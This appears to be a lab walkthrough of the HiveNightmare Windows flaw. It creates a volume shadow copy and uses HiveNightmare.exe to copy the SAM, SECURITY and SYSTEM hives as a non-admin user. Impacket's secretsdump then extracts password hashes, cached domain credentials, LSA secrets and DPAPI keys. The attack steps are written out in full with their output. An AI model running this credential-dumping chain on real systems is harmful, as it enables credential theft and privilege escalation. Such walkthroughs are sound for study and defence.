To work this vulnerability, there should be volume shadow copy in the current system.

To test it we can create shadow copy with wmic

	PS C:\Windows\system32> WMIC.exe shadowcopy call create volume='c:\'
	Executing (Win32_ShadowCopy)->create()
	Method execution successful.
	Out Parameters:
	instance of __PARAMETERS
	{
			ReturnValue = 0;
			ShadowID = "{67A0E469-2D0E-4232-B8D5-644F914B973C}";
	};

List shadow copies

	PS C:\Windows\system32> wmic shadowcopy list brief
	ClientAccessible  ID                                      Imported  InstallDate                NoAutoRelease  NoWriters  Persistent  VolumeName
	TRUE              {67A0E469-2D0E-4232-B8D5-644F914B973C}  FALSE     20210911152644.464288+060  TRUE           TRUE       TRUE        \\?\Volume{7fd4e63d-ccfe-4422-9e9f-d100db8dcbe7}\


	PS C:\Windows\system32> vssadmin list shadows
	vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
	(C) Copyright 2001-2013 Microsoft Corp.

	Contents of shadow copy set ID: {c321fe2f-bd90-4df8-ae21-93fdbdf75117}
	   Contained 1 shadow copies at creation time: 11/09/2021 15:26:44
		  Shadow Copy ID: {67a0e469-2d0e-4232-b8d5-644f914b973c}
			 Original Volume: (C:)\\?\Volume{7fd4e63d-ccfe-4422-9e9f-d100db8dcbe7}\
			 Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
			 Originating Machine: pc-win10.valhalla.local
			 Service Machine: pc-win10.valhalla.local
			 Provider: 'Microsoft Software Shadow Copy provider 1.0'
			 Type: ClientAccessible
			 Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
			 

We will read SAM SYSTEM and SECURİTY file from volume shadow copy 

	PS C:\Users\testuser\Desktop> .\HiveNightmare.exe
	HiveNightmare v0.6 - dump registry hives as non-admin users
	Specify maximum number of shadows to inspect with parameter if wanted, default is 15.
	Running...
	Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
	Success: SAM hive from 2021-09-11 written out to current working directory as SAM-2021-09-11
	Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
	Success: SECURITY hive from 2021-09-11 written out to current working directory as SECURITY-2021-09-11
	Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
	Success: SYSTEM hive from 2021-09-11 written out to current working directory as SYSTEM-2021-09-11
	Assuming no errors above, you should be able to find hive dump files in current working directory.
	


We will read content of SAM

	┌──(kali㉿kali)-[~/Downloads]
	└─$ secretsdump.py LOCAL -sam SAM-2021-09-11 -system SYSTEM-2021-09-11 -security SECURITY-2021-09-11 
	Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

	[*] Target system bootKey: 0x1275b04c99aa7ea7e5ebcfe2c8925423
	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e2920a939049177df3f1c08ae1ff62e4:::
	win10:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	nightmare:1005:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
	[*] Dumping cached domain logon information (domain/username:hash)
	VALHALLA.LOCAL/testuser:$DCC2$10240#testuser#dba152dcac68179962a74bace63c7336
	[*] Dumping LSA Secrets
	[*] $MACHINE.ACC 
	$MACHINE.ACC:plain_password_hex:a155e8b72d7c54f4c9abb78e414f678e5d966ccf159d9d5a1e942ce2fe47ca1d0e9b155cd28e5aa145837e0afd760311056904b877988a93426294aaf7fccdeb55a0cdbcb94c8885a8c0c9446e5f75d014b5b30329b99aa7f64c6c869d2ca2ee85c5e08421784e02df1a0d04357cedc2e83997a83c049c66c14339c82a4ca8235ee29980f19b9bb0fd566c4600462d5db386633d9b092a8890d1dcbfc09e1934f25904f6dceef6e551e88a87adc267de5be4a7be6841d9015dc350abc3ba937e8fe60f0c5ab26819e21b637268fce4bd48df3dec87aec499094a648317a63b4a1a7a3e6476da6899de13a3bb3c2b53d7
	$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e1a3aa8e003bdca58ba8554c30561bae
	[*] DPAPI_SYSTEM 
	dpapi_machinekey:0x3f8d44197b6f26114a25cf48e48b28b5d84a9cac
	dpapi_userkey:0xb500dcefd1814773d57aa9448861a93cf726ee1f
	[*] NL$KM 
	 0000   7E D9 B8 E8 E9 A4 C5 16  50 D5 66 9A 3A CA 91 5D   ~.......P.f.:..]
	 0010   66 65 99 ED E0 C1 45 CA  44 BF 28 A7 37 A4 DC 35   fe....E.D.(.7..5
	 0020   4E B2 3D 76 00 70 E8 E0  A2 1A A0 5F 59 20 0A 1C   N.=v.p....._Y ..
	 0030   89 D3 DF F9 A9 38 AA 06  20 40 05 42 AE 60 8C CA   .....8.. @.B.`..
	NL$KM:7ed9b8e8e9a4c51650d5669a3aca915d666599ede0c145ca44bf28a737a4dc354eb23d760070e8e0a21aa05f59200a1c89d3dff9a938aa0620400542ae608cca
	[*] Cleaning up... 
